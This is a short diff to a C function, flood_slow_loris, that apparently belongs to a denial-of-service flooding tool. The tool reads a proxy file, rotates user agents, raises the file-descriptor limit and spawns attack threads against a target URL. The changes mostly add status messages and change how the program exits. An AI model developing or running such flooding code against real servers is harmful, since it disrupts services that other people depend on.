@@ -282,7 +282,9 @@ void flood_slow_loris(char *url_to_attack, int num_threads, char *file_pr, int f
         FILE *pFile = fopen(file_pr, "rb");
         if(pFile==NULL)
         {
-                perror("fopen"); exit(1);
+                fprintf(stdout, "Invalid Proxy File Exiting...\n");
+                perror("fopen"); 
+                exit(1);
         }
         fseek(pFile, 0, SEEK_END);
         long lSize = ftell(pFile);
@@ -311,6 +313,7 @@ void flood_slow_loris(char *url_to_attack, int num_threads, char *file_pr, int f
                         head->useragent = useragents[rand() % (sizeof(useragents)/sizeof(char *))];
                         head->next = head;
                         head->prev = head;
+                        
                 } else {
                         struct list *new_node = (struct list *)malloc(sizeof(struct list));
                         bzero(new_node, sizeof(struct list));
@@ -328,6 +331,7 @@ void flood_slow_loris(char *url_to_attack, int num_threads, char *file_pr, int f
                         new_node->prev = head;
                         new_node->next = head->next;
                         head->next = new_node;
+                        //fprintf(stderr, "Inside Body%x\n", pch);
                 }
         }
         free(buffer);
@@ -336,6 +340,7 @@ void flood_slow_loris(char *url_to_attack, int num_threads, char *file_pr, int f
         int result;
         rl.rlim_cur = kOpenFD;
         rl.rlim_max = kOpenFD;
+        fprintf(stdout, "Starting Flood...\n");
         result = setrlimit(RLIMIT_NOFILE, &rl);
         if (result != 0)
         {
@@ -372,8 +377,6 @@ void flood_slow_loris(char *url_to_attack, int num_threads, char *file_pr, int f
         postpayload = malloc(4096);
         sprintf(postpayload, postformat, returnparts[path]->value, returnparts[host]->value);
         freeparts();
-      
-            //fprintf(stdout, "Starting Flood...\n");
         
         fnAttackInformation(num_threads);
         for(i = 0;i<num_threads;i++){
@@ -394,7 +397,8 @@ void flood_slow_loris(char *url_to_attack, int num_threads, char *file_pr, int f
         for(i=0; i<num_threads; i++){
                 pthread_join(thread[i], NULL);
         }
-        return;
+        fprintf(stdout, "All Threads joined\n");
+        _exit(0);
 
 }
 
